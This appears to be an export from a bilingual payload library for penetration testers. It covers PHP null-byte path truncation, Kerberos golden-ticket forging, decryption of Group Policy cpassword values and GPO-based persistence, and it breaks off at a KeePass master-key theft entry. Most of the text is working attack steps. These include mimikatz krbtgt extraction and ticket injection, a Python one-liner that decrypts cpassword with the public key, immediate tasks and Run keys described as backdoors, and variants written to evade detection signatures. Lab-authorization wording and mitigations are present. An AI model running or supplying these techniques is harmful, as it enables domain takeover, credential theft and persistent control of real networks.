description.zh: 定位输入参数、全部解码或规范化层、最终处理器和运行身份，并逐项确认前提“目标运行时和文件函数版本已确认，并可在允许根目录外放置无敏感测试标记。”与“能够关联原始 URL、完全解码值、应用拼接结果、规范路径和文件访问日志。”。
description.en: Locate the input parameter, every decoding or canonicalization layer, the final processor, and runtime identity, then confirm both prerequisites: The runtime and file-function versions are confirmed, with a nonsensitive marker placed outside the allowed root. Raw URL, fully decoded value, application-appended path, canonical path, and file-access logs can be correlated.

title.zh: 建立“路径空字节截断”对照基线
title.en: Establish the Path Null-Byte Truncation control baseline

description.zh: 使用合法业务对象、明确拒绝对象和无敏感固定标记记录响应、规范值、文件或网络事件以及处理器选择，作为后续逐行比较基线。
description.en: Use a valid business object, an explicitly rejected object, and a nonsensitive fixed marker to record response, canonical value, file or network events, and processor selection as the line-by-line baseline.

title.zh: 逐行验证“旧版 PHP 文件路径空字节截断”
title.en: Validate Legacy PHP File-Path Null-Byte Truncation line by line

description.zh: 严格保留原始集合的字节和顺序，每轮只提交一行，并把危险目标替换为隔离标记。按“阳性必须证明 NUL 后缀在最终文件调用前被截断，并实际读取隔离标记；400/500、NUL 警告、参数回显或旧漏洞文档与目标无关时均为假阳性。”判定结果，禁止从字符串命中直接推导漏洞。
description.en: Preserve the original set byte-for-byte and in order, submit one line per run, and replace dangerous targets with isolated markers. Apply this result boundary: A positive requires proof that the suffix after NUL is truncated before the final file call and that the isolated marker is read; 400 or 500 responses, NUL warnings, reflection, or unrelated legacy documentation are false positives.

title.zh: 修复并回归“旧版 PHP 文件路径空字节截断”
title.en: Remediate and regress Legacy PHP File-Path Null-Byte Truncation

description.zh: 实施“升级受支持的 PHP，拒绝控制字符和 NUL，完全解码后解析规范绝对路径，并在文件 API 前强制固定根目录。”后，从同一入口重放正常与异常对照；确认业务功能未退化、危险边界不可达，并删除本次测试产生的文件、归档、缓存和关联数据。
description.en: After applying this remediation: Use supported PHP, reject controls and NUL, fully decode and resolve a canonical absolute path, and enforce a fixed root immediately before file access. Replay normal and abnormal controls through the same entry, confirm business behavior remains intact and the dangerous boundary is unreachable, and delete files, archives, caches, and correlated data created by the test.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 目标运行时和文件函数版本已确认，并可在允许根目录外放置无敏感测试标记。
prerequisites.en: The runtime and file-function versions are confirmed, with a nonsensitive marker placed outside the allowed root.

prerequisites.zh: 能够关联原始 URL、完全解码值、应用拼接结果、规范路径和文件访问日志。
prerequisites.en: Raw URL, fully decoded value, application-appended path, canonical path, and file-access logs can be correlated.

analysis.zh: 旧版 PHP 文件路径空字节截断必须按实际数据流判定。阳性必须证明 NUL 后缀在最终文件调用前被截断，并实际读取隔离标记；400/500、NUL 警告、参数回显或旧漏洞文档与目标无关时均为假阳性。还应保存原始值、完全解码或规范值、最终处理器、运行身份和同一请求 ID 的服务端证据，以区分入口接受、静态存储、读取、解析和执行。
analysis.en: Legacy PHP File-Path Null-Byte Truncation must be judged from the actual data flow. A positive requires proof that the suffix after NUL is truncated before the final file call and that the isolated marker is read; 400 or 500 responses, NUL warnings, reflection, or unrelated legacy documentation are false positives. Preserve the raw value, fully decoded or canonical value, final processor, runtime identity, and server evidence for the same request identifier to distinguish entry acceptance, static storage, reading, parsing, and execution.

opsecTips.zh: 验证“旧版 PHP 文件路径空字节截断”时每轮只使用一个固定标记；一旦出现真实敏感数据、非预期解释、进程创建、写入、外连或服务不稳定，立即停止并保留请求 ID。
opsecTips.en: For Legacy PHP File-Path Null-Byte Truncation, use one fixed marker per run; stop immediately and retain the request identifier on real sensitive data, unintended interpretation, process creation, writes, egress, or service instability.

opsecTips.zh: 完成“旧版 PHP 文件路径空字节截断”后删除上传文件、测试归档、标记文件和临时监听器，清理对象存储、CDN 与解析缓存，并按保留策略处理包含标记的日志。
opsecTips.en: After Legacy PHP File-Path Null-Byte Truncation, delete uploads, test archives, marker files, and temporary listeners, clear object-store, CDN, and parser caches, and handle marker-bearing logs under the retention policy.

description.zh: 绕过对单扩展校验逻辑：多个空字节与扩展叠加触发不同解析路径；passwd 内容返回即成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。
description.en: Stack null bytes with multiple extensions against single-extension validation; returned passwd content confirms success. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths.

description.zh: 绕过空字节已被禁用的旧版环境：超长路径在 4096 边界截断仍指向目标；文件读取成功即成功。
description.en: Overflow past the 4096 boundary when null bytes are disabled; a successful read confirms success.

description.zh: 绕过对 %00 单层还原后拦截的规则：二次编码在应用层才截断；内容返回即成功。
description.en: Double-encode the null so truncation happens only at the application layer; returned content confirms success.

description.zh: 二次解码还原 %00。判据：包含 shell 而非 shell.php 模板。
description.en: Second decode restores the null. Success: includes shell instead of the template.

description.zh: 编码遍历加截断。判据：越目录包含成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。
description.en: Encoded traversal plus truncation. Success: cross-directory include works. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths.

description.zh: 过滤器内截断白名单后缀。判据：读出 config 源码。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。
description.en: Truncates inside the filter wrapper. Success: config source read. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths.

title.zh: 文件包含路径空字节边界验证块 1
title.en: File-Include Path Null-Byte Boundary Validation Block 1

wafBypass.command:
BASE="http://127.0.0.1:8080"
curl --fail --silent --show-error --max-time 3 "$BASE/include?page=PAYLOADER_MARKER"
curl --fail --silent --show-error --max-time 3 "$BASE/include?page=../fixtures/PAYLOADER_MARKER%00"
curl --fail --silent --show-error --max-time 3 "$BASE/include?page=../fixtures/MISSING_MARKER%00"
printf "%s\n" "compare parser log, canonical path, and exact PAYLOADER_MARKER output"

description.zh: 以 marker 正例与 MISSING 负例对照发送 %00 截断路径，验证 %00 截断在当前运行时的实际效果并比对解析日志。受控样例：用于建立基线/对照，非独立绕过手法。
description.en: Sends %00-truncated paths with a marker positive case and a MISSING negative control, verifying the real effect of %00 truncation on the current runtime via parser logs. Control sample: establishes a baseline for comparison and is not a standalone bypass technique.

title.en: Validation step 1 for Legacy PHP File-Path Null-Byte Truncation

description.zh: Null字节绕过(老版本PHP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：老版本 PHP 下 %00 截断读取到目标文件，新版本返回拼接路径错误。
description.en: Run this Legacy PHP File-Path Null-Byte Truncation validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: on legacy PHP the %00 truncation reads the target file, while modern versions error on the concatenated path.

name.zh: 黄金票据前置条件与检测审计

description.zh: 验证 krbtgt 哈希可获取性（需域管级授权）与伪造黄金票据的检测面，评估该链前提。
description.en: With domain-admin authorization, validates krbtgt hash reachability and forges a golden ticket carrying arbitrary group SIDs, showing that the KDC cannot distinguish it from a genuine ticket and detection hinges on the double krbtgt password reset.

overview.zh: 黄金票据前置条件与检测审计覆盖 krbtgt 凭据滥用场景：针对已获取域 krbtgt NTLM 哈希的测试主体，验证能否伪造任意身份的 TGT 并通过 KDC 校验。验证维度涵盖 krbtgt 哈希提取、身份基线记录、黄金票据伪造注入与票据核验四步流程。
overview.en: Golden-Ticket Preconditions and Detection Audit covers krbtgt credential abuse: for a test principal holding the domain krbtgt NTLM hash, verify whether arbitrary TGTs can be forged and accepted by the KDC. Verification dimensions unfold across four steps: krbtgt hash extraction, identity baseline recording, golden ticket forging and injection, and ticket verification.

vulnerability.zh: 根因是 krbtgt 账户哈希是域内全部 TGT 的加密密钥，持有该哈希即可为任意用户伪造含任意组 SID 的 TGT，KDC 无法区分伪造与真实票据；krbtgt 密码长期不轮换时，该伪造能力在密码修改前无限期有效。
vulnerability.en: The root cause is that the krbtgt account hash is the signing key for every TGT in the domain, so holding it permits forging TGTs for any user with arbitrary group SIDs that the KDC cannot distinguish from genuine tickets; while the krbtgt password is never rotated, the forgery capability persists indefinitely.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 mimikatz lsadump::lsa /inject 提取 krbtgt 的 NTLM 哈希与域 SID；第 2 步用 whoami /user 记录当前身份基线以便对比；第 3 步用 kerberos::golden 填入第 1 步取得的 SID 与哈希伪造 Administrator 黄金票据并 /ptt 注入；第 4 步用 klist 确认域管理员票据生效且可访问任意服务，即确认伪造链路成功。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 extracts the krbtgt NTLM hash and domain SID with mimikatz lsadump::lsa /inject; step 2 records the current identity baseline with whoami /user for comparison; step 3 forges an Administrator golden ticket with kerberos::golden using the SID and hash from step 1 and injects it via /ptt; step 4 verifies with klist that the domain-admin ticket is active and grants arbitrary service access, confirming the forgery chain. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
按两阶段轮换 krbtgt 密码（首次随机重置，间隔超过票据寿命后再次重置），监控 4768/4769 异常寿命或签名：
    Set-ADAccountPassword krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText '<随机强口令>' -Force)
    # 间隔 >10 小时（默认 TGT 寿命）后重复执行一次完成第二阶段
mitigation.en: Rotate the krbtgt password in two passes (first reset to a random value, second after the ticket lifetime), and monitor 4768/4769 requests with abnormal lifetimes or signatures; the rotation is mandatory after any DC compromise. After the fix, tickets forged with the old hash must be rejected by the KDC.

title.zh: 提取 krbtgt 账号哈希

description.zh: 运行 lsadump::lsa /inject /name:krbtgt；拿到 krbtgt 的 NTLM 与 AES 哈希即黄金票据的伪造原料入库。
description.en: Run lsadump::lsa /inject /name:krbtgt; the NTLM and AES hashes harvested are the raw material for forging golden tickets.

description.zh: 运行 whoami /user 取当前用户 SID 并去掉末位 RID；得到域 SID 即票据参数齐备，避免手工拼写出错。
description.en: Run whoami /user, take the user SID and strip the final RID; the domain SID completes the ticket parameters and avoids hand-crafted mistakes.

title.en: Forge and inject the golden ticket

description.zh: 用 kerberos::golden 传入域 SID 与 krbtgt 哈希伪造 Administrator 票据并注入当前会话；命令执行无报错即黄金票据铸造成功，可即刻访问域资源。
description.en: Forge an Administrator ticket with kerberos::golden using the domain SID and krbtgt hash, then inject; a clean run means the ticket is minted.

description.zh: 用 klist 查看注入票据，随后直接访问任意域内主机的共享资源；各主机均可成功登录即获得全域管理员级控制权。
description.en: Check klist, then access shares on arbitrary domain hosts; logging in everywhere proves domain-admin level control.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 黄金票据前置条件与检测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Golden-Ticket Preconditions and Detection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: 黄金票据前置条件与检测审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Golden-Ticket Preconditions and Detection Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 伪造票据一旦使用即污染 Kerberos 基线——只在实验域使用并在验证后清除；krbtgt 材料不落盘。
opsecTips.en: A used golden ticket pollutes the Kerberos baseline — use it only in the lab domain and purge tickets afterwards; never persist krbtgt material.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 mimikatz lsadump 特征与本地落地：远程仅提取 krbtgt 哈希；输出 krbtgt NTLM 即黄金票据前提成立。
description.en: Extract only the krbtgt hash remotely, avoiding mimikatz lsadump signatures and local file drops; output krbtgt NTLM confirms the golden-ticket prerequisite.

description.zh: 以管理模块走复制协议取哈希，避开敏感工具进程告警；输出 SupplementalCredentials 即成功。
description.en: Fetch the hash over the replication protocol via an admin module, dodging sensitive-tool process alerts; SupplementalCredentials output confirms success.

wafBypass.command: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | grep -i krbtgt

description.zh: 规避与域控的任何交互：对已落地快照离线解析；输出 krbtgt 行即成功。
description.en: Parse an already-landed snapshot offline with zero DC interaction; a krbtgt line in the output confirms success.

title.en: Validation step 1 for Golden-Ticket Preconditions and Detection Audit

description.zh: 获取 krbtgt 账户哈希；成功时输出 krbtgt NTLM 哈希与域 SID。
description.en: Obtain the krbtgt account hash; output showing the krbtgt NTLM hash and domain SID confirms success.

title.en: Golden-Ticket Preconditions and Detection Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GOLDEN_TICKET_E_2 与蓝队日志；成功时确认当前用户上下文并记录基线身份。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GOLDEN_TICKET_E_2 with blue-team logs; the current user context recorded as the identity baseline confirms success.

title.en: Golden-Ticket Preconditions and Detection Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GOLDEN_TICKET_E_3 与蓝队日志；成功时黄金票据注入成功，klist 显示域管理员票据且可访问任意服务。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GOLDEN_TICKET_E_3 with blue-team logs; the golden ticket injecting with klist showing a domain-admin ticket able to reach any service confirms success.

title.en: Golden-Ticket Preconditions and Detection Audit Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GOLDEN_TICKET_E_4 与蓝队日志；成功时 klist 列出注入的以 Administrator 身份向 krbtgt 服务申请的 TGT（即伪造的黄金票据）。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GOLDEN_TICKET_E_4 with blue-team logs; klist listing the injected krbtgt ticket confirms success.

name.zh: GPP cpassword 遗留配置审计

description.zh: 在 SYSVOL 共享中定位 Groups.xml 并解密 cpassword 字段，验证组策略遗留凭据的可读性。
description.en: Locates Groups.xml on the SYSVOL share and decrypts its cpassword field with the published AES key, proving that unremediated Group Policy Preferences still disclose historical local-administrator passwords to any domain user.

overview.zh: 该 Payload 覆盖 GPP cpassword 遗留配置审计场景，检验 SYSVOL 中组策略偏好是否残留可解密口令。验证维度含 XML 检索、PowerView 提取、单值解密与域控批量抓取五步中的四类路径，对应第 1 至第 5 步。
overview.en: This payload covers GPP cpassword legacy-configuration auditing, testing whether Group Policy preferences in SYSVOL still hold decryptable passwords. Validation covers XML discovery, PowerView extraction, single-value decryption and domain-controller batch retrieval, mapped to steps 1 through 5.

vulnerability.zh: 根因在于组策略偏好历史版本使用公开 AES 密钥加密 cpassword 字段且补丁后旧文件残留：任何域用户读取 SYSVOL 即可还原历史本地管理员口令。
vulnerability.en: The root cause is legacy Group Policy preferences encrypting cpassword with a published AES key while unpatched files linger: any domain user reading SYSVOL can recover historical local-admin passwords.

exploitation.zh: 第 1 步在 SYSVOL 递归查找 XML 输出路径清单；第 2 步以 PowerShell 确认可读范围；第 3 步用 PowerView 的 Get-NetGPPPassword 提取用户名与明文；第 4 步用 gpp-decrypt 解密单个 cpassword 验证；第 5 步用 Get-GPPPassword.py 批量抓取。任一路径还原明文即确认遗留口令。占位符在全局变量菜单替换。
exploitation.en: In step 1, recursively find XML under SYSVOL printing paths. In step 2, confirm readability with PowerShell. In step 3, extract usernames and plaintext with PowerView's Get-NetGPPPassword. In step 4, decrypt a single cpassword with gpp-decrypt. In step 5, batch-retrieve with Get-GPPPassword.py. Any path recovering plaintext confirms the lingering password. Replace placeholders via the global variables menu.

mitigation.zh:
安装 KB2962486 后全量清除 SYSVOL 残留 cpassword，轮换曾用于组策略的本地管理员口令并审计 SYSVOL 全量文件：
    Get-ChildItem "\\corp.local\SYSVOL" -Recurse -Include *.xml |
      Select-String -Pattern "cpassword" -List | ForEach-Object { Remove-Item $_.Path -Force }
    Set-ADAccountPassword -Identity local-admin -Reset `
      -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid().Guid + "Xk9!") -Force)
    修复后重放第 1、5 步，检索应无 cpassword 残留且批量抓取为空。
mitigation.en: Install KB2962486 to purge historical cpassword values, rotate local passwords once used in GPO, and audit the full SYSVOL tree. After the fix, replay steps 1 and 5: no cpassword remnants should be found and batch retrieval returns empty.

title.zh: 定位 SYSVOL 组策略 XML
title.en: Locate group policy XML in SYSVOL

description.zh: 在域 SYSVOL 共享递归查找全部 XML 文件；输出组策略偏好文件清单即锁定可能携带 cpassword 字段的目标，任何域用户都可读该共享。
description.en: Recursively find XML files on the SYSVOL share; the Group Policy Preferences list marks targets likely carrying a cpassword field, readable by any domain user.

description.zh: 从 XML 中取出 cpassword 字段并用 gpp-decrypt 以微软公开的 AES 密钥解密；输出明文即还原历史本地管理员口令，可直接尝试远程登录。
description.en: Pull the cpassword value and decrypt it with gpp-decrypt using the public Microsoft AES key; the plaintext restores the old local-admin password for direct reuse.

attackChain.payload: python3 -c "from Crypto.Cipher import AES;from base64 import b64decode;k=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b');c=b64decode('{LAB_CPASSWORD}');print(AES.new(k,AES.MODE_CBC,iv=bytes(16)).decrypt(c)[:-c[-1]].decode())"

description.zh: 用 PowerView 的 Get-NetGPPPassword 自动扫描并解密组策略口令；直接输出用户名与明文即跳过手工解析，快速摸清口令遗留的覆盖范围。
description.en: Run Get-NetGPPPassword to auto-scan and decrypt; usernames with plaintext come out directly, mapping the leftover-password surface without manual parsing.

title.zh: 远程批量收割残留口令

description.zh: 用 Get-GPPPassword.py 连接域控自动抓取并解密全部组策略口令；批量拿到多组凭据后即可尝试口令复用，横向移动到同口令主机。
description.en: Point Get-GPPPassword.py at the DC to fetch and decrypt every stored password in bulk; the batch of credentials feeds password-reuse lateral movement.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 GPP cpassword 遗留配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Legacy GPP cpassword Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: GPP cpassword 遗留配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Legacy GPP cpassword Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 解出的 cpassword 是历史本地管理员口令，验证后在报告中标注而非留存明文；SYSVOL 读取走正常域通道，避免全网共享扫描噪音。
opsecTips.en: Record recovered cpassword values in the report instead of keeping plaintext copies, and read SYSVOL through the normal domain channel rather than wide share scanning.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 PowerShell 模块加载特征（PowerView/Get-GPPPassword 告警）：原生 findstr 直接扫 SYSVOL。成功判据：输出含 cpassword 的策略 XML 行。
description.en: Evades PowerShell module-load signatures (PowerView/Get-GPPPassword alerts) by scanning SYSVOL with native findstr. Success: lines with cpassword from policy XMLs are output.

wafBypass.command: python3 -c "from Crypto.Cipher import AES;from base64 import b64decode;k=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b');c=b64decode('{LAB_CPASSWORD}');print(AES.new(k,AES.MODE_CBC,iv=bytes(16)).decrypt(c)[:-c[-1]].decode())"

description.zh: 真·零工具依赖的本地解密：AES-256-CBC 使用公开的微软 GPP 固定密钥与全零 IV，在操作机本地解开 cpassword（仅 pycryptodome），全程不与域控建立连接，规避 impacket/PowerView 的出网与会话特征。判据：输出明文口令。
description.en: Truly zero-tool decryption of the collected cpassword: AES-256-CBC with the well-known Microsoft GPP key and a zero IV, run locally with nothing but pycryptodome and no domain-controller connection at all, evading outbound-session and tool-process signatures. Success: the plaintext password prints.

title.zh: 远程 SMB 直连抓取规避变体

description.zh: 绕过 PowerShell 递归枚举与盘符挂载产生的浏览日志：impacket 经独立 SMB 会话直接读取并解析策略文件。成功判据：返回 cpassword 明文集合。
description.en: Evades SMB-mount SYSVOL browsing logs by parsing policy files through remote interfaces. Success: a set of decrypted cpassword values returns.

description.zh: 查找 SYSVOL 中的 XML 文件；输出组策略 XML 路径清单即定位完成，可交由 cpassword 解密步骤。
description.en: Locate XML files in SYSVOL; the printed list of Group Policy XML paths completes locating for the cpassword decryption step.

title.zh: 扫描 SYSVOL 中的组策略 XML
title.en: Scan SYSVOL for Group Policy XML files

description.zh: 递归列出域 SYSVOL 共享中的全部 XML 文件，定位可能包含 cpassword 的组策略偏好设置。
description.en: Recursively lists all XML files in the domain SYSVOL share to locate Group Policy Preferences that may contain cpassword values.

description.zh: 用 PowerView Get-NetGPPPassword 提取；输出包含用户名与明文口令即确认 GPP 口令遗留。
description.en: Extract with PowerView Get-NetGPPPassword; output containing usernames and plaintext passwords confirms legacy GPP passwords.

description.zh: 用公开 AES 密钥解密组策略 XML 中提取的 cpassword 字段，还原历史本地管理员口令。
description.en: Decrypts the cpassword field extracted from Group Policy XML with the well-known AES key to recover the legacy local-administrator password.

title.zh: 批量提取域控 GPP 口令
title.en: Bulk-extract GPP passwords from the domain controller

description.zh: 用 Get-GPPPassword.py 连接域控自动抓取并解密全部组策略偏好口令。
description.en: Uses Get-GPPPassword.py against the domain controller to automatically collect and decrypt all Group Policy Preference passwords.

name.zh: 组策略编辑权限与变更审计

description.zh: 审计 GPO 编辑与链接权限，验证策略下发通道的滥用面。
description.en: Uses an authorized GpoEdit grant to inject an immediate scheduled task via New-GPOImmediateTask and a Run-key registry preference, showing that policy edits propagate through SYSVOL and execute with admin rights at client refresh.

overview.zh: 组策略编辑权限与变更审计覆盖 GPO 滥用场景：针对持有 GPO 编辑权限的测试主体，验证能否通过即时任务与注册表首选项在应用范围内部署命令执行。验证维度涵盖 GpoEdit 授权枚举、GPO 即时任务创建与注册表首选项写入三类。
overview.en: Group-Policy Edit-Permission and Change Audit covers GPO abuse: for a test principal holding GPO edit rights, verify whether immediate tasks and registry preferences can deploy command execution across the GPO's scope. Verification dimensions cover GpoEdit grant enumeration, GPO immediate task creation, and registry preference writes.

vulnerability.zh: 根因是 GpoEdit 权限允许修改 GPO 内容并随客户端刷新自动应用：New-GPOImmediateTask 可注入计划任务，Set-GPPrefRegistryValue 可写 Run 键，两者都沿 SYSVOL 刷新链以高权限执行，使 GPO 编辑权等价于域内批量命令执行。
vulnerability.en: The root cause is that GpoEdit rights permit modifying GPO content that clients apply automatically on refresh: New-GPOImmediateTask injects a scheduled task and Set-GPPrefRegistryValue writes Run keys, both executing with high privilege along the SYSVOL refresh chain, so GPO edit rights equal domain-wide batch command execution.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-GPO -All 配合 Get-GPPermission 枚举授予 Domain Users GpoEdit 权限的 GPO 清单，命中即确认可滥用授权；第 2 步用 New-GPOImmediateTask 在目标 GPO 下创建即时任务，客户端应用后命令执行即确认；第 3 步用 Set-GPPrefRegistryValue 写入 HKLM Run 启动项，客户端刷新后键值出现即确认替代路径。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 enumerates GPOs granting Domain Users GpoEdit with Get-GPO -All plus Get-GPPermission — hits confirm abusable grants; step 2 creates an immediate task under the target GPO with New-GPOImmediateTask — command execution after client application confirms; step 3 writes an HKLM Run startup value with Set-GPPrefRegistryValue — the value appearing after client refresh confirms the alternate path. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
按最小权限回收普通账号 GpoEdit 授权并分层管理，监控 GPO 版本与内容变更（5136/5141）及即时任务、首选项写入：
    Set-GPPermission -Name '{LAB_GPO}' -TargetName 'Domain Users' -TargetType Group -PermissionLevel None
    Get-GPO -All | % { $_ | Get-GPPermission -TargetName 'Domain Users' -TargetType Group -ErrorAction SilentlyContinue }
    auditpol /set /subcategory:"Directory Service Changes" /success /failure
mitigation.en: Revoke GpoEdit from ordinary accounts per least privilege and adopt tiered GPO management; monitor GPO version and content changes (5136/5141) plus immediate-task and preference write contents. After the fix, regress with the step 1 sample: ordinary accounts must hold no GPO edit permissions.

description.zh: 用 Get-GPO -All 过滤 Domain Users 拥有 GpoEdit 权限的策略；返回的策略名即可被普通用户滥用的全域推送入口。
description.en: Filter Get-GPO -All for policies where Domain Users hold GpoEdit; the returned names are domain-wide push entries abusable by normal users.

attackChain.payload: Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }

title.zh: 植入即时任务下发载荷

description.zh: 用 New-GPOImmediateTask 向该 GPO 写入执行 cmd 的 Backdoor 任务；策略刷新后域内机器批量执行即载荷送达。
description.en: Write a Backdoor immediate task into the GPO with New-GPOImmediateTask; machines across the domain executing it after refresh confirm delivery.

description.zh: 用 Set-GPPrefRegistryValue 写入 HKLM Run 键指向 C:\backdoor.exe；主机重启自动加载即完成全域持久化控制。
description.en: Write the HKLM Run key to C:\backdoor.exe with Set-GPPrefRegistryValue; auto-load on reboot across the domain completes persistent control.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 组策略编辑权限与变更审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Group-Policy Edit-Permission and Change Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: 组策略编辑权限与变更审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Group-Policy Edit-Permission and Change Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: GPO 变更会下发到全部链接对象——绑定到仅含实验机的 OU 并在验证后解除链接还原 GPO；Immediate-Task 动作限定 marker。
opsecTips.en: GPO edits propagate to every linked object — link them only to an OU holding lab machines, unlink and restore the GPO after verification, and keep the immediate-task action to a marker command.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: LDAP 枚举 GPO 路径

description.zh: 规避 GroupPolicy 模块调用特征：LDAP 直查 GPO 容器对象；返回 gPCFileSysPath 即拿到 SYSVOL 落点。
description.en: Query GPO containers directly over LDAP past GroupPolicy-module signatures; returned gPCFileSysPath values give the SYSVOL landing points.

description.zh: 以文件系统 ACL 检查替代 GPO API 查询：发现可写主体即存在组策略滥用面。
description.en: Check filesystem ACLs directly instead of GPO API queries; any writable principal found confirms the abuse surface.

description.zh: 以官方备份动作替代在线权限枚举：导出后离线比对策略与权限差异；备份目录生成即成功。
description.en: Export via the official backup action then diff offline, replacing online permission enumeration; a generated backup directory confirms success.

title.zh: 清点可编辑 GPO 权限
title.en: Group-Policy Edit-Permission and Change Audit Reviewed Command 1

execution.command: Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GROUP_POLICY_ABUSE_E_1 与蓝队日志；成功时列出授予 Domain Users GpoEdit 权限的 GPO 清单。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GROUP_POLICY_ABUSE_E_1 with blue-team logs; a listing of GPOs granting Domain Users GpoEdit permission confirms success.

title.zh: GPO 即时任务下发命令
title.en: Group-Policy Edit-Permission and Change Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_GROUP_POLICY_ABUSE_E_2 与蓝队日志；成功时在实验 GPO 下创建即时任务，客户端应用后执行命令。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_GROUP_POLICY_ABUSE_E_2 with blue-team logs; the immediate task created under the lab GPO and executing on clients confirms success.

description.zh: 在实验 GPO 创建注册表启动项；成功时客户端应用 GPO 后 HKLM Run 键出现对应值项。
description.en: Create a registry run-key entry in the lab GPO; the value appearing under the HKLM Run key after clients apply the GPO confirms success.

name.zh: KeePass 密钥库定位与主密钥窃取

